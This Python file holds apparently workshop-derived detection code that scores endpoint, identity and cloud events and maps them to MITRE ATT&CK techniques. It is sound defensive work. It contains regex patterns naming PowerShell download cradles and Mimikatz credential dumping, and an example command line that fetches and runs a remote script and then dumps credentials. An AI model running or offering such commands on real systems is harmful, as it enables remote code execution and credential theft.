"""
detections.py

Behavior-based scoring for detections across three domains, mirroring the
different Falcon detection sources the workshop referenced:

  endpoint  (EPP)       -> Falcon sensor on a host        -> contain the host
  identity  (IDP)       -> Falcon Identity Protection      -> disable the user
  cloud     (CSPM/CDR)  -> Falcon Cloud Security           -> disable the key

Each domain has its own scorer that maps observed behavior to MITRE ATT&CK
technique IDs, then `score()` dispatches on the detection's "domain" field.
The point: match on what happened, not on tool names.
"""

import re

from deobfuscate import normalize

# --- endpoint patterns ---------------------------------------------------
_CRADLE = re.compile(r"(downloadstring|downloadfile|downloaddata|invoke-webrequest|iwr|invoke-restmethod|irm)")
_EXEC = re.compile(r"(iex|invoke-expression)")
_MIMI = re.compile(r"(mimikatz|sekurlsa|logonpasswords|privilege::debug|dumpcreds|lsass)")
_HIDDEN = re.compile(r"(-w\s+h|-windowstyle\s+hidden|-nop|-noprofile|-ep\s+bypass|-executionpolicy\s+bypass)")

# --- identity signals: indicator string -> (MITRE, points) ---------------
_IDENTITY_SIGNALS = {
    "impossible_travel": ("T1078 Valid accounts: impossible travel", 70),
    "mfa_fatigue": ("T1621 MFA request generation (push bombing)", 80),
    "mfa_disabled": ("T1556 Modify authentication: MFA disabled", 85),
    "password_spray": ("T1110.003 Password spraying", 70),
    "legacy_auth": ("T1078 Valid accounts: legacy auth used", 50),
    "new_device_admin": ("T1078 Valid accounts: admin from new device", 75),
}

# --- cloud signals: indicator string -> (MITRE, points) ------------------
_CLOUD_SIGNALS = {
    "root_api_usage": ("T1078.004 Cloud accounts: root/owner API use", 85),
    "cloudtrail_disabled": ("T1562.008 Disable cloud logs", 90),
    "public_s3_exposure": ("T1537 Data exposed to public storage", 70),
    "new_access_key": ("T1098.001 Additional cloud credentials created", 70),
    "unusual_region": ("T1535 Unused cloud region accessed", 50),
    "privilege_escalation": ("T1098 Cloud account manipulation", 80),
}


def score_endpoint(event: dict) -> dict:
    image = event.get("image", "").lower()
    cmd = normalize(event.get("command_line", ""))
    hits = []
    if "powershell" in image:
        if _CRADLE.search(cmd) and _EXEC.search(cmd):
            hits.append("T1059.001 PowerShell download cradle (in-memory exec)")
        if _MIMI.search(cmd):
            hits.append("T1003.001 Credential dumping from LSASS")
        if _HIDDEN.search(cmd):
            hits.append("T1564 Hidden/obfuscated execution flags")
    score = 90 if any("T1003.001" in h for h in hits) else 70 if hits else 0
    return {"hits": hits, "risk_score": score, "normalized_command": cmd}


def _score_signals(event: dict, table: dict) -> dict:
    hits, score = [], 0
    for sig in event.get("signals", []):
        if sig in table:
            label, pts = table[sig]
            hits.append(label)
            score = max(score, pts)
    return {"hits": hits, "risk_score": score}


def score_identity(event: dict) -> dict:
    return _score_signals(event, _IDENTITY_SIGNALS)


def score_cloud(event: dict) -> dict:
    return _score_signals(event, _CLOUD_SIGNALS)


def score(event: dict) -> dict:
    """Dispatch on the detection domain. Returns {hits, risk_score, host}."""
    domain = event.get("domain", "endpoint")
    if domain == "identity":
        result = score_identity(event)
    elif domain == "cloud":
        result = score_cloud(event)
    else:
        result = score_endpoint(event)
    result["host"] = event.get("host") or event.get("user") or event.get("resource")
    result["domain"] = domain
    return result


# Backwards-compatible alias used by earlier versions/tests.
score_command = score_endpoint


if __name__ == "__main__":
    import json
    examples = [
        {"domain": "endpoint", "host": "ECL-WKS-0421", "image": "powershell.exe",
         "command_line": "IEX (New-Object Net.WebClient).DownloadString('http://x/m.ps1'); Invoke-Mimikatz -DumpCreds"},
        {"domain": "identity", "user": "swilson@corp.com", "signals": ["impossible_travel", "mfa_fatigue"]},
        {"domain": "cloud", "resource": "arn:aws:iam::acct:user/deploy", "signals": ["cloudtrail_disabled", "new_access_key"]},
    ]
    for e in examples:
        print(json.dumps(score(e), indent=2))
